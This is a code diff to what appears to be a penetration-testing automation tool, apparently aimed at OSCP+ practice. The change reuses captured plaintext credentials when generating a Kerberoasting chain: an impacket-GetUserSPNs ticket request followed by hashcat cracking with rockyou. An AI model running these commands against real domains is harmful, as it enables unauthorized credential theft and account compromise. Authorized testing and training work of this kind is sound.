@@ -510,11 +510,21 @@ def run(report, store, ui=None):
     # kerberoastable SPN owner (BloodHound hasspn). One command per user
     # is the canonical OSCP+ pattern and lets the operator scope-creep
     # only the user that actually has the SPN.
+    # iter-58: if we've seen any plaintext cred, use the FIRST one as the
+    # authenticating principal instead of the '<owned-user>:<password>'
+    # placeholder. Kerberoast needs any authenticated request; the operator
+    # can swap to a stronger cred later if needed.
+    _kb_owner = "<owned-user>"
+    _kb_pw = "<password>"
+    if e.creds:
+        ((_owned_lc, _owned_pw), _occs) = next(iter(e.creds.items()))
+        _kb_owner = _occs[0][0] if _occs[0][0] != "<user>" else _owned_lc
+        _kb_pw = _owned_pw
     for u in e.kerberoastable:
         chains.append(Chain("R9", "kerberoast", f"kerberoastable: {u}",
             crit=6, conf=0.8, ready=0.7, prox=max(0.7, _prox(store, dc())),
             commands=[f"impacket-GetUserSPNs -request-user '{u}' -dc-ip {dc()} "
-                      f"{dom}/<owned-user>:<password>",
+                      f"{dom}/{_kb_owner}:{_kb_pw}",
                       f"hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"],
             src="bloodhound"))
     if e.has_tgs:
